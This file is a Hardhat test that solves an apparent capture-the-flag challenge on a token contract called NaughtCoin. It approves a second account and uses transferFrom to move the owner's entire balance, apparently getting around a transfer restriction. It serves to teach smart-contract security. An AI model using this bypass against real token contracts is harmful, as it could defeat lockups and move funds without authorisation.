const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const CONTRACT_NAME = "NaughtCoin";

describe(CONTRACT_NAME, () => {
  async function deployLoadFixture() {
    const [owner, account1] = await ethers.getSigners();
    const NaughtCoin = await ethers.getContractFactory(CONTRACT_NAME);
    const naughtCoin = await NaughtCoin.deploy(owner.address);

    return { naughtCoin, owner, account1 };
  }

  it("Challenge solved", async () => {
    let tx;
    let { naughtCoin, owner, account1 } = await loadFixture(deployLoadFixture);

    // allow account1 to spend all the owner's amount on behalf of him
    tx = await naughtCoin.approve(account1.address, ethers.BigNumber.from('1000000').mul(ethers.BigNumber.from('10').pow('18')));
    await tx.wait();

    // transfer all the owner's tokens
    tx = await naughtCoin.connect(account1).transferFrom(
      owner.address,
      account1.address,
      ethers.BigNumber.from('1000000').mul(ethers.BigNumber.from('10').pow('18'))
    );
    await tx.wait();

    //test
    const ownerBalance = await naughtCoin.balanceOf(owner.address);
    expect(ownerBalance).to.equal(0);
  });
});
